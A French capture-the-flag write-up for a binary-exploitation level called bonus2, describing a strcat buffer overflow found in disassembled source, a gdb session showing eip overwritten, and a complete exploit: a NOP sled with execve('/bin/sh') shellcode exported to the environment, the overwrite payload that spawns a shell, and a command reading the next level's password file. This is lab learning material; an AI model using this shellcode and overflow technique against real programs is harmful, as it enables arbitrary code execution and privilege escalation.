## bonus2
- En examinant le [code source désassemblé](source.c), on repère une faille envisageable au niveau du [`strcat`](https://linux.die.net/man/3/strcat) :
    - > The strcat() function appends the src string to the dest string, overwriting the terminating null byte ('\0') at the end of dest, and then adds a terminating null byte. The strings may not overlap, and the dest string must have enough space for the result. *If dest is not large enough, program behavior is unpredictable; buffer overruns are a favorite avenue for attacking secure programs.*
    - On arrive effectivement à réécrire l'`eip` (testé avec `LANG=nl`) :
    ```
    (gdb) r $(python -c "print 'A'*40") BBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLL
    Starting program: /home/user/bonus2/bonus2 $(python -c "print 'A'*40") BBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLL
    Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLL

    Program received signal SIGSEGV, Segmentation fault.
    0x4a4a4a49 in ?? ()
    (gdb) i r
    eax            0x56	86
    ecx            0xffffffff	-1
    edx            0xb7fd28b8	-1208145736
    ebx            0xbffff260	-1073745312
    esp            0xbffff210	0xbffff210
    ebp            0x49494848	0x49494848
    esi            0xbffff2ac	-1073745236
    edi            0xbffff25c	-1073745316
    eip            0x4a4a4a49	0x4a4a4a49
    eflags         0x210286	[ PF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    ```
    L'`eip` a pour valeur `IJJJ` => il démarre au 24e caractère de `argv[2]` (et il faudra donc 23 caractères de *padding* dans le `argv[2]` de notre exploit).
- Tout comme dans le [level bonus0](/bonus0/README.md), on va écraser l'`eip` et le faire pointer vers un *shellcode* exporté préalablement dans l'environnement.
    - `export EXPLOIT=$(python -c 'print "\x90" * 1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')`
    - Depuis `gdb`, mettre un *breakpoint* sur `main` puis lancer l'exécution. Utiliser `x/10s *((char **)environ)` pour retrouver l'adresse de notre exploit dans l'environnement => `0xbffff4f0`. Toutefois, cette adresse peut changer selon les arguments, on va donc ajouter 256 octets de décalage => `0xbffff5f0` (ce décalage n'impacte en rien le fonctionnement de notre exploit, puisque ce dernier commence par 1024 octets de [`NOP`](https://en.wikipedia.org/wiki/NOP_(code))).
    - ``./bonus2 `python -c 'print "A"*40'` `python -c 'print "\x90"*23 + "\xf0\xf5\xff\xbf"'` ``nous permet bien de lancer un *shell*. `cat /home/user/bonus3/.pass` pour récupérer le *flag*.